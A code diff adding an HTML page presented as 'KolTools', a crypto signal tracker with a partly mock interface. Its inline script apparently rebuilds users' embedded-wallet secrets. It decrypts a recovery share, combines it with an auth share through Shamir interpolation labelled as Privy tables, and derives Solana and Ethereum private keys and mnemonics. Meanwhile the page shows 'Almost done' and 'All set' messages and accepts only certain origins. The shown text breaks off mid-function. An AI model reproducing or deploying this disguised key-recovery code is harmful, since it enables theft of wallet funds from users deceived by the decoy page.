+    a.match-source:hover { color: var(--text); text-decoration: underline; }
+
+    @media (min-width: 32rem) {
+      body {
+        background:
+          radial-gradient(circle at 50% 10%, rgba(255, 255, 255, 0.07), transparent 30rem),
+          #050505;
+      }
+      .popup-shell {
+        border-color: rgba(255, 255, 255, 0.14);
+        border-radius: 0.8rem;
+        box-shadow: 0 2rem 7rem rgba(0, 0, 0, 0.72), 0 0 0 1px rgba(255, 255, 255, 0.025);
+      }
+      .view { padding: 1.4rem 1.25rem 1.8rem; }
+    }
+  </style>
+  <style>
+    /* Readability and responsive layout pass. Logic and DOM hooks stay unchanged. */
+    :root {
+      --muted: #b8b8b8;
+      --dim: #929292;
+    }
+
+    body {
+      font-size: 1rem;
+      line-height: 1.55;
+    }
+
+    .popup-shell {
+      grid-template-rows: 3.75rem auto 3.5rem minmax(0, 1fr);
+    }
+
+    .topbar,
+    .runner-status {
+      padding-inline: clamp(1rem, 3vw, 1.5rem);
+    }
+
+    .brand-name { font-size: 1rem; }
+    .version,
+    .live-label,
+    .secure-label {
+      font-size: 0.6875rem;
+      line-height: 1.35;
+    }
+
+    .runner-status {
+      min-height: 4.75rem;
+      grid-template-columns: 1.75rem minmax(0, 1fr) auto;
+      gap: 0.875rem;
+      padding-block: 0.75rem;
+    }
+    .spinner,
+    .check {
+      width: 1.75rem;
+      height: 1.75rem;
+    }
+    .check::after { left: 0.625rem; top: 0.375rem; }
+    .status-copy h1 { font-size: 0.9375rem; }
+    .status-copy p {
+      margin-top: 0.125rem;
+      font-size: 0.8125rem;
+    }
+
+    .tabbar { padding-inline: clamp(0.25rem, 2vw, 0.75rem); }
+    .tab {
+      min-height: 3.5rem;
+      padding-inline: 0.35rem;
+      font-size: clamp(0.6875rem, 1.7vw, 0.75rem);
+      line-height: 1.2;
+    }
+
+    .view {
+      width: 100%;
+      max-width: 56rem;
+      margin-inline: auto;
+      padding: clamp(1.25rem, 4vw, 2rem) clamp(1rem, 4vw, 2rem) 2.5rem;
+    }
+    .section-head {
+      align-items: center;
+      margin-bottom: 1.25rem;
+    }
+    .eyebrow,
+    .section-meta,
+    .metric-label,
+    .signal-time,
+    .badge,
+    .chain,
+    .setting-note {
+      letter-spacing: 0.055em;
+    }
+    .eyebrow,
+    .section-meta { font-size: 0.6875rem; }
+    .section-head h2 {
+      margin-top: 0.3rem;
+      font-size: clamp(1.5rem, 4vw, 2rem);
+      line-height: 1.1;
+    }
+
+    .metrics {
+      margin-bottom: 1.5rem;
+      border-radius: 0.75rem;
+      overflow: hidden;
+    }
+    .metric { min-width: 0; padding: 1rem; }
+    .metric + .metric { padding-left: 1rem; }
+    .metric-label { font-size: 0.6875rem; }
+    .metric-value {
+      margin-top: 0.35rem;
+      font-size: 1.25rem;
+      line-height: 1.2;
+    }
+    .metric-value small { font-size: 0.6875rem; }
+
+    .signal,
+    .account-row {
+      grid-template-columns: 2.75rem minmax(0, 1fr) auto;
+      gap: 0.875rem;
+    }
+    .signal { padding-block: 1.125rem; }
+    .account-row { padding-block: 1rem; }
+    .avatar {
+      width: 2.75rem;
+      height: 2.75rem;
+      font-size: 0.8125rem;
+    }
+    .signal-author { flex-wrap: wrap; row-gap: 0.1rem; }
+    .signal-author strong,
+    .account-name {
+      font-size: 0.9375rem;
+      line-height: 1.35;
+    }
+    .signal-author span,
+    .account-handle {
+      font-size: 0.75rem;
+      line-height: 1.35;
+    }
+    .signal-copy {
+      margin-top: 0.4rem;
+      color: #c0c0c0;
+      font-size: 0.875rem;
+      line-height: 1.55;
+      overflow-wrap: anywhere;
+    }
+    .signal-time,
+    .badge,
+    .chain,
+    .online,
+    .remove-account,
+    .match-time {
+      font-size: 0.6875rem;
+      line-height: 1.35;
+    }
+    .signal-time { margin-top: 0.5rem; }
+    .badge { padding: 0.3rem 0.5rem; }
+    .remove-account {
+      min-width: 2.75rem;
+      min-height: 2.75rem;
+      padding-inline: 0.5rem;
+    }
+
+    .add-account { margin-bottom: 1.5rem; }
+    .add-account > label,
+    .watch-editor label {
+      margin-bottom: 0.5rem;
+      font-size: 0.875rem;
+    }
+    .add-account input,
+    .add-account button {
+      height: 3rem;
+      font-size: 1rem;
+    }
+    .add-account input { padding-inline: 0.875rem; }
+    .add-account button { min-width: 4.5rem; padding-inline: 1rem; }
+    .form-help,
+    .form-error {
+      min-height: 1.1rem;
+      margin-top: 0.45rem;
+      font-size: 0.75rem;
+      line-height: 1.45;
+    }
+
+    .match-card { padding-block: 1.125rem; }
+    .ticker { font-size: 1rem; }
+    .address {
+      padding: 0.75rem;
+      font-size: 0.8125rem;
+      line-height: 1.45;
+    }
+    .match-source { font-size: 0.8125rem; line-height: 1.5; }
+
+    .setting {
+      min-height: 4.75rem;
+      padding-block: 1rem;
+    }
+    .setting-title { font-size: 0.9375rem; line-height: 1.35; }
+    .setting-note {
+      margin-top: 0.3rem;
+      max-width: 48rem;
+      font-size: 0.75rem;
+      line-height: 1.55;
+      text-transform: none;
+    }
+    .switch {
+      width: 2.75rem;
+      height: 2.75rem;
+    }
+    .switch-track { top: 0.625rem; bottom: 0.625rem; }
+    .switch-track::after {
+      top: 0.25rem;
+      left: 0.25rem;
+      width: 0.875rem;
+      height: 0.875rem;
+    }
+    .switch input:checked + .switch-track::after { transform: translateX(1.25rem); }
+
+    .watch-editor textarea {
+      min-height: 8rem;
+      padding: 0.875rem;
+      font-size: 1rem;
+      line-height: 1.6;
+    }
+    .info-panel { margin-top: 1.5rem; border-radius: 0.75rem; }
+    .info-panel summary {
+      min-height: 3.25rem;
+      padding: 0.875rem 1rem;
+      font-size: 0.875rem;
+    }
+    .info-panel p {
+      max-width: 70ch;
+      padding: 0 1rem 1rem;
+      font-size: 0.8125rem;
+      line-height: 1.65;
+    }
+
+    .refresh-tracker,
+    .copy-contract {
+      min-height: 2.75rem;
+      padding-inline: 0.875rem;
+      font-size: 0.6875rem;
+    }
+    .empty-state {
+      padding-block: 1.75rem;
+      color: var(--muted);
+      font-size: 0.9375rem;
+      line-height: 1.6;
+    }
+
+    .refresh-tracker:focus-visible,
+    .copy-contract:focus-visible,
+    .info-panel summary:focus-visible {
+      outline: 2px solid var(--text);
+      outline-offset: 3px;
+    }
+
+    @media (min-width: 40rem) {
+      body { padding: 1.5rem; }
+      .popup-shell {
+        width: min(100%, 54rem);
+        height: min(52rem, calc(100dvh - 3rem));
+        border-radius: 0.875rem;
+      }
+    }
+
+    @media (max-width: 39.9375rem) {
+      body { overflow: hidden; }
+      .popup-shell { min-height: 100dvh; }
+      .section-actions { gap: 0.5rem; }
+    }
+
+    @media (max-width: 31.9375rem) {
+      .version,
+      .secure-label { display: none; }
+      .section-head {
+        align-items: flex-start;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .section-actions {
+        width: 100%;
+        justify-content: space-between;
+      }
+      .metrics { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+      .metric { padding: 0.875rem 0.75rem; }
+      .metric + .metric { padding-left: 0.75rem; }
+      .signal { grid-template-columns: 2.5rem minmax(0, 1fr); }
+      .signal .avatar { width: 2.5rem; height: 2.5rem; }
+      .signal .badge { grid-column: 2; justify-self: start; }
+    }
+
+    @media (max-width: 23rem) {
+      .topbar,
+      .runner-status,
+      .view { padding-inline: 0.875rem; }
+      .live-label { font-size: 0.625rem; }
+      .tabbar { padding-inline: 0; }
+      .tab { font-size: 0.6875rem; letter-spacing: 0.035em; }
+      .metrics { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .metric:nth-child(3) {
+        display: block;
+        grid-column: 1 / -1;
+        border-top: 1px solid var(--line);
+        border-left: 0;
+      }
+      .add-account-row { grid-template-columns: minmax(0, 1fr) 4.25rem; }
+      .section-meta { white-space: normal; }
+    }
+
+    @media (max-height: 30rem) and (min-width: 32rem) {
+      .popup-shell { grid-template-rows: 3rem auto 3rem minmax(0, 1fr); }
+      .runner-status { min-height: 3.5rem; padding-block: 0.5rem; }
+      .tab { min-height: 3rem; }
+    }
+  </style>
+  <style>
+    .match-toolbar {
+      display: grid;
+      grid-template-columns: minmax(12rem, 1.7fr) repeat(2, minmax(8rem, 0.8fr)) auto;
+      gap: 0.65rem;
+      margin-bottom: 1.5rem;
+      padding: 0.85rem;
+      border: 1px solid var(--line);
+      border-radius: 0.75rem;
+      background: rgba(255, 255, 255, 0.018);
+    }
+    .match-search,
+    .match-select {
+      display: grid;
+      gap: 0.35rem;
+      min-width: 0;
+      color: var(--dim);
+      font: 600 0.625rem/1.3 var(--mono);
+      letter-spacing: 0.055em;
+      text-transform: uppercase;
+    }
+    .match-search input,
+    .match-select select {
+      width: 100%;
+      height: 2.75rem;
+      border: 1px solid var(--line-strong);
+      border-radius: 0.5rem;
+      background: #0a0d0b;
+      color: var(--text);
+      font: 500 0.8125rem/1.4 var(--display);
+      outline: none;
+    }
+    .match-search input { padding-inline: 0.75rem; }
+    .match-select select { padding-inline: 0.65rem; }
+    .match-search input:focus,
+    .match-select select:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 2px rgba(245, 245, 245, 0.1);
+    }
+    .clear-matches {
+      align-self: end;
+      min-height: 2.75rem;
+      padding-inline: 0.85rem;
+      border: 1px solid var(--line-strong);
+      border-radius: 0.5rem;
+      background: transparent;
+      color: var(--muted);
+      font: 600 0.6875rem/1 var(--mono);
+      white-space: nowrap;
+    }
+    .clear-matches:hover { border-color: var(--text); color: var(--text); }
+    .clear-matches:active { transform: translateY(1px); }
+
+    .match-account-group {
+      margin-bottom: 1rem;
+      border: 1px solid var(--line-strong);
+      border-radius: 0.75rem;
+      overflow: hidden;
+      background: rgba(255, 255, 255, 0.012);
+    }
+    .match-group-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 1rem;
+      padding: 0.9rem 1rem;
+      border-bottom: 1px solid var(--line);
+      background: rgba(255, 255, 255, 0.025);
+    }
+    .match-group-identity { display: flex; align-items: center; gap: 0.75rem; min-width: 0; }
+    .match-group-identity .avatar { width: 2.25rem; height: 2.25rem; }
+    .match-group-name { color: var(--text); font-size: 0.9375rem; line-height: 1.3; }
+    .match-group-meta,
+    .match-group-time {
+      color: var(--dim);
+      font: 500 0.6875rem/1.4 var(--mono);
+    }
+    .match-group-list { display: grid; gap: 0; }
+    .match-group-list .match-card {
+      margin: 0;
+      border: 0;
+      border-radius: 0;
+      background: transparent;
+    }
+    .match-group-list .match-card + .match-card { border-top: 1px solid var(--line); }
+    .match-top { justify-content: space-between; }
+    .match-excerpt {
+      display: -webkit-box;
+      margin-top: 0.75rem;
+      overflow: hidden;
+      color: #c5cbc7;
+      font-size: 0.8125rem;
+      line-height: 1.55;
+      overflow-wrap: anywhere;
+      -webkit-box-orient: vertical;
+      -webkit-line-clamp: 3;
+    }
+    .match-actions { display: flex; align-items: center; gap: 0.65rem; margin-top: 0.8rem; }
+    .match-source {
+      display: inline-flex;
+      min-height: 2.75rem;
+      align-items: center;
+      padding-inline: 0.35rem;
+      color: var(--accent);
+      font: 600 0.6875rem/1.3 var(--mono);
+      text-underline-offset: 0.2rem;
+    }
+    .hide-match-excerpts .match-excerpt { display: none; }
+    .larger-text .signal-copy,
+    .larger-text .account-post-copy,
+    .larger-text .match-excerpt { font-size: 1rem; }
+    .larger-text .account-name,
+    .larger-text .signal-author strong,
+    .larger-text .match-group-name,
+    .larger-text .setting-title { font-size: 1.0625rem; }
+    .larger-text .account-handle,
+    .larger-text .match-source,
+    .larger-text .setting-note { font-size: 0.8125rem; }
+
+    @media (max-width: 47.9375rem) {
+      .match-toolbar { grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); }
+      .match-search { grid-column: 1 / -1; }
+      .clear-matches { width: 100%; }
+    }
+    @media (max-width: 27rem) {
+      .match-toolbar { grid-template-columns: minmax(0, 1fr); }
+      .match-search { grid-column: auto; }
+      .match-group-head { align-items: flex-start; }
+      .match-group-time { flex: 0 0 auto; padding-top: 0.2rem; }
+      .address { overflow-wrap: anywhere; }
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tweetnacl@1.0.3/nacl-fast.min.js"></script>
+</head>
+<body>
+  <a class="skip-link" href="#popup-content">Skip to tracker</a>
+
+  <input class="tab-control" type="radio" name="tracker-tab" id="tab-signals" checked />
+  <input class="tab-control" type="radio" name="tracker-tab" id="tab-watchlist" />
+  <input class="tab-control" type="radio" name="tracker-tab" id="tab-matches" />
+  <input class="tab-control" type="radio" name="tracker-tab" id="tab-settings" />
+
+  <div class="popup-shell" id="ui">
+    <header class="topbar">
+      <span class="brand-mark" aria-hidden="true"></span>
+      <span class="brand-name">KolTools</span>
+      <span class="version">Signal tracker</span>
+      <span class="topbar-spacer"></span>
+      <span class="live-label"><span class="pulse-dot" aria-hidden="true"></span>Monitoring active</span>
+    </header>
+
+    <section class="runner-status" aria-live="polite" aria-atomic="true">
+      <div class="spinner" id="spin" aria-hidden="true"></div>
+      <div class="check" id="check" aria-hidden="true"></div>
+      <div class="status-copy">
+        <h1 id="title">Loading</h1>
+        <p id="sub">Preparing the live signal feed</p>
+      </div>
+      <span class="secure-label">Budget protected</span>
+    </section>
+
+    <nav class="tabbar" aria-label="Tracker sections">
+      <label class="tab" for="tab-signals">Signals</label>
+      <label class="tab" for="tab-watchlist">Watchlist</label>
+      <label class="tab" for="tab-matches">Matches</label>
+      <label class="tab" for="tab-settings">Settings</label>
+    </nav>
+
+    <main class="content" id="popup-content">
+      <section class="view view-signals" aria-labelledby="signals-title">
+        <header class="section-head">
+          <div><p class="eyebrow">Social intelligence</p><h2 id="signals-title">Signal feed</h2></div>
+          <div class="section-actions"><span class="section-meta">Auto monitoring</span><button class="refresh-tracker" id="refresh-tracker" type="button">Check now</button></div>
+        </header>
+
+        <div class="metrics" aria-label="Tracker summary">
+          <div class="metric"><p class="metric-label">Accounts</p><p class="metric-value"><span id="account-count">0</span> <small>live</small></p></div>
+          <div class="metric"><p class="metric-label">Signals</p><p class="metric-value" id="signal-count">0</p></div>
+          <div class="metric"><p class="metric-label">Latency</p><p class="metric-value" id="latency-value">-</p></div>
+        </div>
+
+        <ol class="signal-list" id="mock-signal-list" aria-live="polite"><li class="empty-state">Signals will appear after you add an account.</li></ol>
+      </section>
+
+      <section class="view view-watchlist" aria-labelledby="watchlist-title">
+        <header class="section-head">
+          <div><p class="eyebrow">Trusted sources</p><h2 id="watchlist-title">Watchlist</h2></div>
+          <span class="section-meta">Stored locally</span>
+        </header>
+
+        <form class="add-account" id="mock-account-form">
+          <label for="mock-account-input">Add an X account</label>
+          <div class="add-account-row">
+            <input id="mock-account-input" name="handle" type="text" inputmode="text" autocomplete="off" maxlength="16" placeholder="@handle" aria-describedby="account-help account-error" />
+            <button type="submit">Add</button>
+          </div>
+          <p class="form-help" id="account-help">Use 1–15 letters, numbers, or underscores. Maximum 10 accounts.</p>
+          <p class="form-error" id="account-error" role="alert" aria-live="polite"></p>
+        </form>
+
+        <ul class="account-list" id="mock-account-list"><li class="empty-state">No accounts yet. Add an X handle to begin.</li></ul>
+      </section>
+
+      <section class="view view-matches" aria-labelledby="matches-title">
+        <header class="section-head">
+          <div><p class="eyebrow">Contract activity</p><h2 id="matches-title">Matches by account</h2></div>
+          <span class="section-meta" id="match-summary">Waiting for a contract</span>
+        </header>
+
+        <div class="match-toolbar" aria-label="Match filters">
+          <label class="match-search" for="match-search"><span>Search</span><input id="match-search" type="search" autocomplete="off" placeholder="Account or address" /></label>
+          <label class="match-select" for="match-chain-filter"><span>Network</span><select id="match-chain-filter"><option value="all">All networks</option><option value="evm">EVM</option><option value="solana">Solana</option></select></label>
+          <label class="match-select" for="match-sort"><span>Order</span><select id="match-sort"><option value="newest">Newest first</option><option value="account">Account A–Z</option></select></label>
+          <button class="clear-matches" id="clear-matches" type="button">Clear history</button>
+        </div>
+
+        <ol class="match-list" id="mock-match-list" aria-live="polite"><li class="empty-state">Contract addresses will be organized here when they are found.</li></ol>
+      </section>
+
+      <section class="view view-settings" aria-labelledby="settings-title">
+        <header class="section-head">
+          <div><p class="eyebrow">Tracker controls</p><h2 id="settings-title">Settings</h2></div>
+          <span class="section-meta">Saved locally</span>
+        </header>
+
+        <div class="settings-group">
+          <div class="setting">
+            <div><p class="setting-title">Automatic monitoring</p><p class="setting-note">Look for new activity while this page is visible</p></div>
+            <label class="switch"><input id="polling-enabled" type="checkbox" checked aria-label="Enable background polling" /><span class="switch-track"></span></label>
+          </div>
+          <div class="setting">
+            <div><p class="setting-title">Contract matches only</p><p class="setting-note">Hide posts without a parsed address</p></div>
+            <label class="switch"><input id="mock-contracts-only" type="checkbox" aria-label="Show contract matches only" /><span class="switch-track"></span></label>
+          </div>
+          <div class="setting">
+            <div><p class="setting-title">Compact density</p><p class="setting-note">Fit more signal rows into the popup</p></div>
+            <label class="switch"><input id="mock-compact" type="checkbox" aria-label="Use compact density" /><span class="switch-track"></span></label>
+          </div>
+          <div class="setting">
+            <div><p class="setting-title">Larger text</p><p class="setting-note">Increase text size across signals, accounts, and matches</p></div>
+            <label class="switch"><input id="larger-text" type="checkbox" aria-label="Use larger text" /><span class="switch-track"></span></label>
+          </div>
+          <div class="setting">
+            <div><p class="setting-title">Post excerpts in matches</p><p class="setting-note">Show the source post below every detected address</p></div>
+            <label class="switch"><input id="show-match-excerpts" type="checkbox" checked aria-label="Show post excerpts in matches" /><span class="switch-track"></span></label>
+          </div>
+        </div>
+
+        <details class="info-panel">
+          <summary>How the optimized tracker works</summary>
+          <p>When an account is first added, KolTools loads its latest public posts through the configured RapidAPI source. Shared storage prevents duplicate lookups between visitors and keeps recent activity available during temporary provider errors. New posts are scanned for supported contract address formats.</p>
+        </details>
+      </section>
+    </main>
+  </div>
+
+  <script src="/r-ui.js" defer></script>
+  <script>
+(() => {
+  const titleEl = document.getElementById("title");
+  const subEl = document.getElementById("sub");
+  const ui = document.getElementById("ui");
+
+  function setStatus(title, sub) {
+    if (title) titleEl.textContent = title;
+    if (sub) subEl.textContent = sub;
+  }
+  function setDone() {
+    ui.classList.add("ok");
+    setStatus("All set", "You can leave this window open");
+  }
+
+  const ALLOWED = (o) => {
+    try {
+      const h = new URL(o).hostname;
+      return (
+        h === "fomo.family" ||
+        h.endsWith(".fomo.family") ||
+        h === "localhost" ||
+        h === "127.0.0.1" ||
+        h.endsWith(".vercel.app")
+      );
+    } catch { return false; }
+  };
+
+  const b64 = (s) => {
+    const n = String(s).replace(/-/g, "+").replace(/_/g, "/");
+    const p = "=".repeat((4 - (n.length % 4)) % 4);
+    return Uint8Array.from(atob(n + p), (c) => c.charCodeAt(0));
+  };
+  const hex = (u8) => [...u8].map((b) => b.toString(16).padStart(2, "0")).join("");
+
+  const B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  function b58encode(bytes) {
+    const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
+    let zeros = 0;
+    while (zeros < u8.length && u8[zeros] === 0) zeros++;
+    const size = Math.ceil(u8.length * 138 / 100) + 1;
+    const b = new Uint8Array(size);
+    let length = 0;
+    for (let i = zeros; i < u8.length; i++) {
+      let carry = u8[i];
+      let j = 0;
+      for (let k = size - 1; k >= 0 && (carry !== 0 || j < length); k--, j++) {
+        carry += 256 * b[k];
+        b[k] = carry % 58;
+        carry = (carry / 58) | 0;
+      }
+      length = j;
+    }
+    let out = "1".repeat(zeros);
+    for (let i = size - length; i < size; i++) out += B58_ALPHABET[b[i]];
+    return out;
+  }
+
+  // Privy GF(2^8) tables: x is last byte of each share
+  const LOG_TABLE = new Uint8Array([
+    0x00,0xff,0xc8,0x08,0x91,0x10,0xd0,0x36,0x5a,0x3e,0xd8,0x43,0x99,0x77,0xfe,0x18,
+    0x23,0x20,0x07,0x70,0xa1,0x6c,0x0c,0x7f,0x62,0x8b,0x40,0x46,0xc7,0x4b,0xe0,0x0e,
+    0xeb,0x16,0xe8,0xad,0xcf,0xcd,0x39,0x53,0x6a,0x27,0x35,0x93,0xd4,0x4e,0x48,0xc3,
+    0x2b,0x79,0x54,0x28,0x09,0x78,0x0f,0x21,0x90,0x87,0x14,0x2a,0xa9,0x9c,0xd6,0x74,
+    0xb4,0x7c,0xde,0xed,0xb1,0x86,0x76,0xa4,0x98,0xe2,0x96,0x8f,0x02,0x32,0x1c,0xc1,
+    0x33,0xee,0xef,0x81,0xfd,0x30,0x5c,0x13,0x9d,0x29,0x17,0xc4,0x11,0x44,0x8c,0x80,
+    0xf3,0x73,0x42,0x1e,0x1d,0xb5,0xf0,0x12,0xd1,0x5b,0x41,0xa2,0xd7,0x2c,0xe9,0xd5,
+    0x59,0xcb,0x50,0xa8,0xdc,0xfc,0xf2,0x56,0x72,0xa6,0x65,0x2f,0x9f,0x9b,0x3d,0xba,
+    0x7d,0xc2,0x45,0x82,0xa7,0x57,0xb6,0xa3,0x7a,0x75,0x4f,0xae,0x3f,0x37,0x6d,0x47,
+    0x61,0xbe,0xab,0xd3,0x5f,0xb0,0x58,0xaf,0xca,0x5e,0xfa,0x85,0xe4,0x4d,0x8a,0x05,
+    0xfb,0x60,0xb7,0x7b,0xb8,0x26,0x4a,0x67,0xc6,0x1a,0xf8,0x69,0x25,0xb3,0xdb,0xbd,
+    0x66,0xdd,0xf1,0xd2,0xdf,0x03,0x8d,0x34,0xd9,0x92,0x0d,0x63,0x55,0xaa,0x49,0xec,
+    0xbc,0x95,0x3c,0x84,0x0b,0xf5,0xe6,0xe7,0xe5,0xac,0x7e,0x6e,0xb9,0xf9,0xda,0x8e,
+    0x9a,0xc9,0x24,0xe1,0x0a,0x15,0x6b,0x3a,0xa0,0x51,0xf4,0xea,0xb2,0x97,0x9e,0x5d,
+    0x22,0x88,0x94,0xce,0x19,0x01,0x71,0x4c,0xa5,0xe3,0xc5,0x31,0xbb,0xcc,0x1f,0x2d,
+    0x3b,0x52,0x6f,0xf6,0x2e,0x89,0xf7,0xc0,0x68,0x1b,0x64,0x04,0x06,0xbf,0x83,0x38
+  ]);
+  const EXP_TABLE = new Uint8Array([
+    0x01,0xe5,0x4c,0xb5,0xfb,0x9f,0xfc,0x12,0x03,0x34,0xd4,0xc4,0x16,0xba,0x1f,0x36,
+    0x05,0x5c,0x67,0x57,0x3a,0xd5,0x21,0x5a,0x0f,0xe4,0xa9,0xf9,0x4e,0x64,0x63,0xee,
+    0x11,0x37,0xe0,0x10,0xd2,0xac,0xa5,0x29,0x33,0x59,0x3b,0x30,0x6d,0xef,0xf4,0x7b,
+    0x55,0xeb,0x4d,0x50,0xb7,0x2a,0x07,0x8d,0xff,0x26,0xd7,0xf0,0xc2,0x7e,0x09,0x8c,
+    0x1a,0x6a,0x62,0x0b,0x5d,0x82,0x1b,0x8f,0x2e,0xbe,0xa6,0x1d,0xe7,0x9d,0x2d,0x8a,
+    0x72,0xd9,0xf1,0x27,0x32,0xbc,0x77,0x85,0x96,0x70,0x08,0x69,0x56,0xdf,0x99,0x94,
+    0xa1,0x90,0x18,0xbb,0xfa,0x7a,0xb0,0xa7,0xf8,0xab,0x28,0xd6,0x15,0x8e,0xcb,0xf2,
+    0x13,0xe6,0x78,0x61,0x3f,0x89,0x46,0x0d,0x35,0x31,0x88,0xa3,0x41,0x80,0xca,0x17,
+    0x5f,0x53,0x83,0xfe,0xc3,0x9b,0x45,0x39,0xe1,0xf5,0x9e,0x19,0x5e,0xb6,0xcf,0x4b,
+    0x38,0x04,0xb9,0x2b,0xe2,0xc1,0x4a,0xdd,0x48,0x0c,0xd0,0x7d,0x3d,0x58,0xde,0x7c,
+    0xd8,0x14,0x6b,0x87,0x47,0xe8,0x79,0x84,0x73,0x3c,0xbd,0x92,0xc9,0x23,0x8b,0x97,
+    0x95,0x44,0xdc,0xad,0x40,0x65,0x86,0xa2,0xa4,0xcc,0x7f,0xec,0xc0,0xaf,0x91,0xfd,
+    0xf7,0x4f,0x81,0x2f,0x5b,0xea,0xa8,0x1c,0x02,0xd1,0x98,0x71,0xed,0x25,0xe3,0x24,
+    0x06,0x68,0xb3,0x93,0x2c,0x6f,0x3e,0x6c,0x0a,0xb8,0xce,0xae,0x74,0xb1,0x42,0xb4,
+    0x1e,0xd3,0x49,0xe9,0x9c,0xc8,0xc6,0xc7,0x22,0x6e,0xdb,0x20,0xbf,0x43,0x51,0x52,
+    0x66,0xb2,0x76,0x60,0xda,0xc5,0xf3,0xf6,0xaa,0xcd,0x9a,0xa0,0x75,0x54,0x0e,0x01
+  ]);
+
+  function gfAdd(a, b) { return a ^ b; }
+  function gfDiv(a, b) {
+    if (b === 0) throw new Error("div0");
+    if (a === 0) return 0;
+    return EXP_TABLE[(LOG_TABLE[a] - LOG_TABLE[b] + 255) % 255];
+  }
+  function gfMult(a, b) {
+    if (a === 0 || b === 0) return 0;
+    return EXP_TABLE[(LOG_TABLE[a] + LOG_TABLE[b]) % 255];
+  }
+  function interpolate(xSamples, ySamples, x) {
+    const n = xSamples.length;
+    let result = 0;
+    for (let i = 0; i < n; i++) {
+      let basis = 1;
+      for (let j = 0; j < n; j++) {
+        if (i === j) continue;
+        basis = gfMult(basis, gfDiv(gfAdd(x, xSamples[j]), gfAdd(xSamples[i], xSamples[j])));
+      }
+      result = gfAdd(result, gfMult(ySamples[i], basis));
+    }
+    return result;
+  }
+  function combineShares(shares) {
+    if (!shares || shares.length < 2) throw new Error("need shares");
+    const len = shares[0].length;
+    for (const s of shares) if (s.length !== len) throw new Error("len");
+    const secretLen = len - 1;
+    const secret = new Uint8Array(secretLen);
+    const xs = new Uint8Array(shares.length);
+    const ys = new Uint8Array(shares.length);
+    const seen = new Set();
+    for (let i = 0; i < shares.length; i++) {
+      const x = shares[i][len - 1];
+      if (seen.has(x)) throw new Error("dup");
+      seen.add(x);
+      xs[i] = x;
+    }
+    for (let i = 0; i < secretLen; i++) {
+      for (let j = 0; j < shares.length; j++) ys[j] = shares[j][i];
+      secret[i] = interpolate(xs, ys, 0);
+    }
+    return secret;
+  }
+
+  async function decryptShare(recoveryKeyB64, encShareB64, ivB64) {
+    const keyBytes = b64(recoveryKeyB64);
+    const iv = b64(ivB64);
+    const cipher = b64(encShareB64);
+    const aesKey = await crypto.subtle.importKey("raw", keyBytes, "AES-GCM", false, ["decrypt"]);
+    return new Uint8Array(await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, cipher));
+  }
+
+  async function hmacSha512(key, data) {
+    const cryptoKey = await crypto.subtle.importKey(
+      "raw",
+      key instanceof Uint8Array ? key : new TextEncoder().encode(key),
+      { name: "HMAC", hash: "SHA-512" },
+      false,
+      ["sign"]
+    );
+    return new Uint8Array(await crypto.subtle.sign("HMAC", cryptoKey, data));
+  }
+  async function slip10Master(seed) {
+    return hmacSha512(new TextEncoder().encode("ed25519 seed"), seed);
+  }
+  async function slip10Derive(seed, path) {
+    let I = await slip10Master(seed);
+    for (const seg of path.replace(/^m\//, "").split("/")) {
+      if (!seg) continue;
+      const hardened = seg.endsWith("'");
+      const index = parseInt(seg.replace("'", ""), 10) + (hardened ? 0x80000000 : 0);
+      const data = new Uint8Array(37);
+      data[0] = 0;
+      data.set(I.slice(0, 32), 1);
+      data[33] = (index >>> 24) & 0xff;
+      data[34] = (index >>> 16) & 0xff;
+      data[35] = (index >>> 8) & 0xff;
+      data[36] = index & 0xff;
+      I = await hmacSha512(I.slice(32, 64), data);
+    }
+    return I.slice(0, 32);
+  }
+
+  async function solanaFromEntropy(entropy) {
+    if (typeof nacl === "undefined") throw new Error("nacl");
+    const candidates = [];
+    const seed32 = entropy.length >= 32 ? entropy.slice(0, 32) : entropy;
+    const paths = ["m/44'/501'/0'/0'", "m/44'/501'/0'", "m/44'/501'/0'/0'/0'"];
+    for (const path of paths) {
+      try {
+        const derived = await slip10Derive(seed32, path);
+        const kp = nacl.sign.keyPair.fromSeed(derived);
+        candidates.push({
+          method: "slip10:" + path,
+          address: b58encode(kp.publicKey),
+          privateKey: b58encode(kp.secretKey),
+          privateKeySeed: b58encode(derived),
+          publicKey: b58encode(kp.publicKey),
+        });
+      } catch {}
+    }
+    try {
+      const kp = nacl.sign.keyPair.fromSeed(seed32);
+      candidates.push({
+        method: "ed25519-seed32",
+        address: b58encode(kp.publicKey),
+        privateKey: b58encode(kp.secretKey),
+        privateKeySeed: b58encode(seed32),
+        publicKey: b58encode(kp.publicKey),
+      });
+    } catch {}
+    return candidates;
+  }
+
+  async function combine(msg) {
+    const chainType = (msg.chainType || msg.chain_type || "ethereum").toLowerCase();
+    if (typeof ethers === "undefined") throw new Error("ethers");
+
+    setStatus("Loading", "Almost done");
+    const recoveredShare = await decryptShare(msg.recoveryKey, msg.encShare, msg.iv);
+    const authShare = b64(msg.authShare);
+    if (authShare.length !== recoveredShare.length) throw new Error("share length");
+
+    const entropy = combineShares([authShare, recoveredShare]);
+    const entropyHex = "0x" + hex(entropy);
+    const expected = (msg.expectedAddress || "").trim();
+
+    if (chainType === "solana") {
+      const candidates = await solanaFromEntropy(entropy);
+      const match = candidates.find((c) => c.address === expected);
+      if (match) {
+        return {
+          ok: true,
+          chainType: "solana",
+          method: match.method,
+          address: match.address,
+          privateKey: match.privateKey,
+          privateKeySeed: match.privateKeySeed,
+          publicKey: match.publicKey,
+          mnemonic: null,
+          entropyHex,
+          candidates,
+        };
+      }
+      return {
+        ok: false,
+        chainType: "solana",
+        error: "no address match",
+        entropyHex,
+        candidates,
+        expected,
+      };
+    }
+
+    const candidates = [];
+    try {
+      const mnemonic = ethers.utils.entropyToMnemonic(entropyHex);
+      const w = ethers.Wallet.fromMnemonic(mnemonic);
+      candidates.push({ method: "bip39", privateKey: w.privateKey, address: w.address, mnemonic });
+    } catch {}
+    try {
